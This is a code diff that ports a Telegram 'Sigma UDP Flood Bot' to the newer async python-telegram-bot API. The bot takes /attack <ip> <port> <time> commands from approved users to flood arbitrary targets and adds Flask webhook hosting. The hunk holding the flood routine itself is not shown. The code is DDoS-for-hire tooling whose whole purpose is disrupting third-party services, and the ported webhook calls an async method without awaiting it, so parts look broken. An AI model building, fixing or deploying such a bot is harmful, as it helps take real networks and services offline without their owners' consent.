@@ -1,5 +1,5 @@
 from telegram import Update
-from telegram.ext import Updater, CommandHandler, CallbackContext, Dispatcher
+from telegram.ext import Application, CommandHandler, ContextTypes
 import subprocess
 import time
 import threading
@@ -28,32 +28,32 @@ def is_approved(chat_id):
     """Check if the user is approved."""
     return chat_id in approved_users
 
-def start(update: Update, context: CallbackContext):
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_approved(update.message.chat_id):
-        update.message.reply_text("🚫 You are not approved to use this bot. Contact the admin.")
+        await update.message.reply_text("🚫 You are not approved to use this bot. Contact the admin.")
         return
 
-    update.message.reply_text("🦾 Welcome to the Sigma UDP Flood Bot! 🦾\n\n"
-                             "Use /attack <ip> <port> <time> to start the attack.\n"
-                             "Example: /attack 192.168.1.1 80 60")
+    await update.message.reply_text("🦾 Welcome to the Sigma UDP Flood Bot! 🦾\n\n"
+                                   "Use /attack <ip> <port> <time> to start the attack.\n"
+                                   "Example: /attack 192.168.1.1 80 60")
 
-def attack(update: Update, context: CallbackContext):
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global attack_active, start_time, duration, chat_id
 
     if not is_approved(update.message.chat_id):
-        update.message.reply_text("🚫 You are not approved to use this bot. Contact the admin.")
+        await update.message.reply_text("🚫 You are not approved to use this bot. Contact the admin.")
         return
 
     if attack_active:
-        update.message.reply_text("🚨 An attack is already in progress. Chill, Sigma. 🚨")
+        await update.message.reply_text("🚨 An attack is already in progress. Chill, Sigma. 🚨")
         return
 
     try:
         # Parse command arguments
         args = context.args
         if len(args) != 3:
-            update.message.reply_text("❌ Usage: /attack <ip> <port> <time>\n"
-                                      "Example: /attack 192.168.1.1 80 60")
+            await update.message.reply_text("❌ Usage: /attack <ip> <port> <time>\n"
+                                           "Example: /attack 192.168.1.1 80 60")
             return
 
         ip, port, time_arg = args
@@ -61,16 +61,16 @@ def attack(update: Update, context: CallbackContext):
         chat_id = update.message.chat_id
 
         # Start the attack in a separate thread
-        attack_thread = threading.Thread(target=run_attack, args=(ip, port, duration, update))
+        attack_thread = threading.Thread(target=run_attack, args=(ip, port, duration, update, context))
         attack_thread.start()
 
-        update.message.reply_text(f"🔥 Attack initiated on {ip}:{port} for {duration} seconds. 🚀\n"
-                                 "Stay tuned for real-time updates, Sigma. 💪")
+        await update.message.reply_text(f"🔥 Attack initiated on {ip}:{port} for {duration} seconds. 🚀\n"
+                                       "Stay tuned for real-time updates, Sigma. 💪")
 
     except Exception as e:
-        update.message.reply_text(f"❌ Error: {str(e)}")
+        await update.message.reply_text(f"❌ Error: {str(e)}")
 
-def run_attack(ip, port, duration, update):
+def run_attack(ip, port, duration, update, context):
     global attack_active, start_time
 
     attack_active = True
@@ -130,60 +130,59 @@ def get_status_bar(progress):
     bar = "█" * filled_length + "░" * (bar_length - filled_length)
     return f"[{bar}]"
 
-def stop(update: Update, context: CallbackContext):
+async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global attack_active
 
     if not is_approved(update.message.chat_id):
-        update.message.reply_text("🚫 You are not approved to use this bot. Contact the admin.")
+        await update.message.reply_text("🚫 You are not approved to use this bot. Contact the admin.")
         return
 
     if attack_active:
         attack_active = False
-        update.message.reply_text("🛑 Attack stopped. Sigma energy preserved. 🛑")
+        await update.message.reply_text("🛑 Attack stopped. Sigma energy preserved. 🛑")
     else:
-        update.message.reply_text("🤷 No active attack to stop. Chill, Sigma. 🤷")
+        await update.message.reply_text("🤷 No active attack to stop. Chill, Sigma. 🤷")
 
-def approve(update: Update, context: CallbackContext):
+async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Approve a user to use the bot."""
     if update.message.chat_id != ADMIN_CHAT_ID:
-        update.message.reply_text("🚫 Only the admin can approve users.")
+        await update.message.reply_text("🚫 Only the admin can approve users.")
         return
 
     try:
         # Parse command arguments
         args = context.args
         if len(args) != 1:
-            update.message.reply_text("❌ Usage: /approve <chat_id>")
+            await update.message.reply_text("❌ Usage: /approve <chat_id>")
             return
 
         user_chat_id = int(args[0])
         if user_chat_id in approved_users:
-            update.message.reply_text(f"🤔 User {user_chat_id} is already approved.")
+            await update.message.reply_text(f"🤔 User {user_chat_id} is already approved.")
         else:
             approved_users.append(user_chat_id)
-            update.message.reply_text(f"✅ User {user_chat_id} has been approved.")
+            await update.message.reply_text(f"✅ User {user_chat_id} has been approved.")
     except Exception as e:
-        update.message.reply_text(f"❌ Error: {str(e)}")
+        await update.message.reply_text(f"❌ Error: {str(e)}")
 
 # Set up the Telegram bot
-updater = Updater(TELEGRAM_BOT_TOKEN)
-dispatcher = updater.dispatcher
+application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
 
 # Add command handlers
-dispatcher.add_handler(CommandHandler("start", start))
-dispatcher.add_handler(CommandHandler("attack", attack))
-dispatcher.add_handler(CommandHandler("stop", stop))
-dispatcher.add_handler(CommandHandler("approve", approve))
+application.add_handler(CommandHandler("start", start))
+application.add_handler(CommandHandler("attack", attack))
+application.add_handler(CommandHandler("stop", stop))
+application.add_handler(CommandHandler("approve", approve))
 
 # Webhook route
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    update = Update.de_json(request.get_json(force=True), updater.bot)
-    dispatcher.process_update(update)
+    update = Update.de_json(request.get_json(force=True), application.bot)
+    application.process_update(update)
     return 'ok'
 
 # Start the Flask app
 if __name__ == "__main__":
     # Set the webhook URL (replace with your Northflank service URL)
-    updater.bot.set_webhook(url="https://your-northflank-service-url/webhook")
+    application.bot.set_webhook(url="https://your-northflank-service-url/webhook")
     app.run(host="0.0.0.0", port=8080)
